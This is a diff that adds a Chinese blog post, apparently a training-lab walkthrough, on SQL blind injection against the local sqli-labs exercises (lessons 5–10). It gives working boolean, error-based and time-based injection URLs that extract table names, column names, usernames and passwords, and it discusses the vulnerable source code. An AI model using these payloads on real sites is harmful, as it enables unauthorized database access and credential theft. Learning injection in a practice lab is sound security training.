@@ -13,6 +13,10 @@
     
 
     
+        <meta name="description" content="SQL盲注
+1）SQL盲注介绍      盲注就是在sql注入过程中， sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为三种类型：基于布尔的SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。
+2） 关于SQL基础语句"/>
+    
 
     <!--Author-->
     
@@ -25,6 +29,10 @@
     
 
     <!--Open Graph Description-->
+    
+        <meta property="og:description" content="SQL盲注
+1）SQL盲注介绍      盲注就是在sql注入过程中， sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为三种类型：基于布尔的SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。
+2） 关于SQL基础语句"/>
     
 
     <!--Open Graph Site Name-->
@@ -191,7 +199,158 @@
 
             <!-- Post Main Content -->
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                
+                <p>SQL盲注</p>
+<p>1）SQL盲注介绍<br>      盲注就是在sql注入过程中， sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为三种类型：基于布尔的SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注。</p>
+<p>2） 关于SQL基础语句<br>      增：insert into tableName(columnName1,columnName2) values(value1,value2)</p>
+<pre><code>  删：delete from tableName where …
+
+  改：update tableName set columnName=value where …
+
+  查：select * from tableName where …
+</code></pre>
+<p>3） Information_schema数据库基本表说明：<br>      schemata表：提供了当前mysql实例中所有的数据库信息，show databases的结果就是从该表得出。具体表可通过phpstudy中MySQL管理器查看。</p>
+<pre><code>  tables表：提供了关于数据库中的所有表的信息，即表属于哪个schema，表的创建时间、表的类型等，show tables fromschemaName的结果就是从该表得出。
+
+  columns表：提供表中所有列信息，即表明了表中所有列及每列的信息，show columns from schemaName.tableName的结果就是从该表得出。
+</code></pre>
+<p><strong>实验步骤一</strong></p>
+<p>我们的任务分为2个部分：</p>
+<p>都是先根据报错信息查看到SQL语句中如何闭合参数，同时我们构造语句进行注入。</p>
+<ol>
+<li> 基于布尔型的SQL盲注，同样是表名-&gt;列名-&gt;字段值的顺序进行爆破</li>
+<li> 基于报错型及时间型的SQL盲注</li>
+</ol>
+<p>任务描述： 突破lesson-5的实验，基于布尔型的SQL盲注，按照表-&gt;列-&gt;值的顺序，最后查看后台源代码。</p>
+<ol>
+<li>  启动phpstudy，打开<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a> 点击page-1后：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=a2edf1fe-b25f-4af1-b469-0aa7b4d37af0.png"></p>
+<ol start="2">
+<li>  点击GET-double injection - single quotes-string less-5，进入如下图实验界面：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=9324f486-bb3c-4123-a470-eb2e7aba685c.png"></p>
+<ol start="3">
+<li>  根据提示加入id参数在url中，可以看到他不再像前面报错注入一样回显有效信息，而是一段you are in…的字符串。如果输入正确提示you are in…输入错误则会报错。同样我们加入单引号，可以看到报错了，报错信息中提示我们输入的id参数使用单引号闭合，我们后面加入注释符即可注释掉原本后面的SQL语句。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=b2dd4e6e-6971-4e00-8389-406908c2298f.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=d0154b74-d2e6-4e3f-a113-836d24bc6597.png"></p>
+<ol start="4">
+<li> 接着我们可以根据他是否报错来判断我们需查询的语句是否正确。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;and">http://localhost/sqli-labs-master/Less-5/?id=1&#39;and</a> left(version(),1)=5–+可以看到数据库版本是大于等于5.0的。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=f9b49b42-a526-4da5-82ec-55b0e0259c07.png"></p>
+<ol start="5">
+<li>  可以利用ascii及substr函数来判断substr所截取的字符串的ascii码值为多少，得出当前的字母，可以利用二分法快一点，同时也可直接利用burpsuite来爆破出当前值，当然也可以写脚本自己跑出来。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;and">http://localhost/sqli-labs-master/Less-5/?id=1&#39;and</a> ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100–+这里limit 0,1意味着取第一张表，如果我们想爆破第二张表即可使用limit 1,1 同时这里使用substr(str,start,length)函数截取的是字符串的第一个字符，若想截取第二个字符即可使用substr(str,2,1)依此类推。当我们取到第三张表，对其进行爆破时我们发现它的表名为users。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=062308e6-253f-44d4-963f-7d22cd7444d7.png"></p>
+<ol start="6">
+<li>   这时我们可以利用regexp正则匹配来获取users表中的列名。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and 1=(select 1 from  information_schema.columns where table_name=’users’ and column_name regexp  ‘^us[a-z]’ limit 0,1)–+将正则匹配到最后时即’^username’正确，即得到列名。也可尝试’^password’发现同样返回正确。如果想确定就是这个列名可使用’^username$’。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=ca1fec50-3747-4976-a543-0154895567b8.png"></p>
+<ol start="7">
+<li>  爆出列名之后，我们可以开始尝试试试对应列的值，这儿又使用其他的函数ord()，mid()，IFNULL()，CAST()，其中ord函数相当于ascii函数，求得最左边字符的ascii码；mid函数相当于substr函数，截取一段字符；IFNULL(a,b)函数是来判断，若a为空则返回b，若a不为空则返回a；CAST(str AS int)将字符串转换为目标数据类型，我们可以这样构造URL：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-5/?id=1&#39;">http://localhost/sqli-labs-master/Less-5/?id=1&#39;</a> and ord(mid((select ifnull(cast(username as char),0x20) from users order by id limit 0,1),1,1))=68–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=82bb3897-34cc-4c5c-8190-4660d5f0075e.png"></p>
+<p>也可在burpsuite中爆破，这儿给出变量设置及最后结果展示图：</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=16a91e50-f482-41ec-a0e4-06229befefb9.png"></p>
+<p>查对应的ascii表可得出第一个username为Dumb。剩下的也一样了。</p>
+<ol start="8">
+<li>  切换到代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=7cfb995f-972b-4ea9-8b57-ba723234765b.png"></p>
+<p> 可以看到在源代码中没有做任何防护，我们可以在构建SQL语句时闭合前面单引号，注释掉后面的内容。同时看到第33行查询到数据之后，不像之前展示出来，而是输出一段字符串you are in…</p>
+<p><strong>实验步骤二</strong></p>
+<p>任务描述： 突破lesson-6的实验，基于报错型及时间型的SQL盲注，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
+<ol>
+<li>  打开lesson-6，加入参数id，同时加入双引号，可通过查看报错情况得知SQL语句使用双引号闭合。不加入双引号时正常显示。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=99d91b99-21c8-4c39-b8a9-052b18a546bd.png"></p>
+<p>接下来可以按照实验任务一中的步骤进行爆值，这儿避免重复用报错注入及延时注入的方式。</p>
+<ol start="2">
+<li>  首先报错注入，这里会列举floor()、extractvalue()、updatexml()、NAME_CONST()四种函数进行演示。这次使用floor函数， <a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-6/?id=1&quot;">http://localhost/sqli-labs-master/Less-6/?id=1&quot;</a> and (select 1 from (select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)–+ </li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=fddbdcfb-ce65-4262-81fd-ce42d2694a97.png"></p>
+<ol start="3">
+<li>  还可以使用上一节中的extractvalue函数，<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-6/?id=1&quot;">http://localhost/sqli-labs-master/Less-6/?id=1&quot;</a> and extractvalue(1,concat(0x7e,(select@@version),0x7e))–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=146fbd73-7c43-4bf6-a8b8-cbc4be8154cc.png"></p>
+<ol start="4">
+<li>  同样updatexml函数也可以，<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-6/?id=1&quot;">http://localhost/sqli-labs-master/Less-6/?id=1&quot;</a> and updatexml(1,concat(0x7e,(select@@version),0x7e),1)–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=40fe8885-7060-4f42-a78b-9263d6700bdc.png"></p>
+<ol start="5">
+<li>  利用数据重复报错也可以，使用NAME_CONST函数。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-6/?id=1&quot;">http://localhost/sqli-labs-master/Less-6/?id=1&quot;</a> and (select 1 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=2643dfc8-3cc8-4f21-bfdf-af38ccbdd8d3.png"></p>
+<ol start="6">
+<li>  报错注入举了前面的例子，当然还有很多，等你去发现。下面可以尝试延时注入，延时注入可以使用sleep函数，以及benchmark函数，首先看一下sleep函数，可以使用<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-6/?id=1&quot;">http://localhost/sqli-labs-master/Less-6/?id=1&quot;</a> and if(mid(user(),1,1) like ‘l’,sleep(5),1)–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=e1f488e2-97fd-4f01-a031-fd5c8b33fe24.png"> </p>
+<ol start="7">
+<li>  接下来可以试试benchmark函数，<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-6/?id=1&quot;">http://localhost/sqli-labs-master/Less-6/?id=1&quot;</a> union select (if(substring(db,1,1)=char(115),benchmark(10000000,sha(1)),null)),2,3 from (select database() as db) as a–+ </li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=dfdc2bbb-a73d-4343-9d2d-fa09f1faf0ef.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=0f8091d9-846d-4c9c-99a7-a55869091fa4.png"></p>
+<ol start="8">
+<li>  切换到代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=c0fece3f-ca86-44b4-8191-ffe9f9843714.png">   </p>
+<p> 同样没有做任何过滤，可以看到id用双引号包起来之后，传入SQL查询语句，36行代码处也只显示you are in…字符串。</p>
+<p><strong>实验步骤三</strong></p>
+<p>任务描述： 突破lesson-8的实验，基于布尔型、延时型的SQL盲注，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
+<ol>
+<li>  打开lesson-8，加入参数id，正常显示：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-8/?id=1%E8%80%8C%E5%BD%93%E5%8A%A0%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E6%97%B6%EF%BC%8C%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%EF%BC%8C%E5%8D%B4%E6%B2%A1%E6%9C%89%E6%8F%90%E7%A4%BA%E9%94%99%E8%AF%AF%E7%9A%84%E5%9C%B0%E6%96%B9%E3%80%82">http://localhost/sqli-labs-master/Less-8/?id=1而当加入单引号时，出现错误，却没有提示错误的地方。</a></li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=6d742b73-a922-4f49-99c4-c81a67c6b7f2.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=0730a06c-dbbd-4b51-8f3b-1893dd2ea0a8.png"></p>
+<ol start="2">
+<li>  那么我们除了不能使用报错注入之外，其余的延时注入、布尔型注入同样都是可以使用的。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-8/?id=1&#39;">http://localhost/sqli-labs-master/Less-8/?id=1&#39;</a> and left(version(),1)=5–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=72c6151c-0ed0-4dfe-ba8d-09dacf583cb5.png"></p>
+<ol start="3">
+<li>接下来的步骤和前面任务一、二的步骤就一样了，这里不再赘述。</li>
+<li>  我们去代码层查看源代码：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=bfdd4005-c20f-4432-9d95-4d71034f07ba.png"></p>
+<p>可以看到44、45、46行报错的信息被注释掉了。同样在SQL查询语句中没有做任何防护，除了报错注入不能使用，他不会返回错误信息之外，基于布尔值的注入，基于时间的注入都能使用。</p>
+<p><strong>实验步骤四</strong></p>
+<p>任务描述： 突破lesson-9的实验，基于延时型的SQL盲注，按照表-&gt;列-&gt;值的顺序。查看后台源代码。</p>
+<ol>
+<li>  打开lesson-9，加入参数id，正常显示：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-9/?id=1%E8%80%8C%E5%BD%93%E5%8A%A0%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E6%97%B6%EF%BC%8C%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%90%8C%E3%80%82">http://localhost/sqli-labs-master/Less-9/?id=1而当加入单引号时，也没有任何不同。</a></li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=fb5496e3-d8e4-4c1e-a765-4c7bd859499f.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=6114d1dd-b950-4196-bc26-a1a003123099.png"></p>
+<ol start="2">
+<li> 我们可以看到它的源代码中：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=c5afff47-9b6b-438b-b7ce-f9ab87290b06.png"></p>
+<p> 在第37及45行中无论是否出错都会显示出you are in…故我们也不能通过基于布尔型的盲注，通过语句构建正确错误时页面的不同展示来判断了，只能使用最后一招延时注入。</p>
+<ol start="3">
+<li>  延时注入，首先猜测表名：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-9/?id=1&#39;">http://localhost/sqli-labs-master/Less-9/?id=1&#39;</a> and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117,1,sleep(5))–+     得到第三张表的表名第一个字符为u，此处报错才延时5秒，若猜对直接返回。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=3d511834-509b-4b08-9b28-c649a386a648.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=44e8b360-43a8-4320-a989-9e2b55f300a5.png"></p>
+<p>第二个字符：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-9/?id=1&#39;">http://localhost/sqli-labs-master/Less-9/?id=1&#39;</a> and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115,1,sleep(5))–+     得到第三张表的表名第二个字符为s</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=efe23e50-4cbe-4d24-9c0d-37652f20d2a4.png"></p>
+<p>依次往下走，可以得出第三张表的表名为users。</p>
+<ol start="4">
+<li>  得到表名之后猜取列名。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-9/?id=1&#39;">http://localhost/sqli-labs-master/Less-9/?id=1&#39;</a> and if(ascii(substr((selectcolumn_name from information_schema.columns where table_name=’users’ and table_schema=database() limit 0,1),1,1))=105,1,sleep(5))–+    得到users表中第一列的列名的第一个字符为i    </li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=5a4a105a-5d1d-44eb-bc80-a085b1a526b1.png"></p>
+<p>  依次往下，可得出列名为id，username，password。</p>
+<ol start="5">
+<li>  得到列名之后可以猜取字段值。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-9/?id=1&#39;">http://localhost/sqli-labs-master/Less-9/?id=1&#39;</a> and if(ascii(substr((select username from users  limit 0,1),1,1))=68,1,sleep(5))–+     得到用户名的第一个字符为D</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=2a777fea-3a08-4e93-ace8-7e93989de4f1.png"></p>
+<p>依次往下，可以得到用户名及密码。</p>
+<p><strong>实验步骤五</strong></p>
+<ol>
+<li>打开lesson-10，加入参数id：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-10/?id=1%E5%8A%A0%E5%85%A5%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%90%8C%E3%80%82">http://localhost/sqli-labs-master/Less-10/?id=1加入单双引号也没有任何不同。</a></li>
+<li>  可以来到代码层查看源代码：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=016151f2-ac87-4190-a164-bda3863b1866.png"></p>
+<p>可以看到第29行，相比实验9只是使用双引号闭合而已，同样仅仅需要将实验九中的闭合符号改为双引号即可。如下图：</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=7f2cde09-0cee-46dd-acb3-f22d9af36f3f.png"></p>
+
 
                 
             </div>
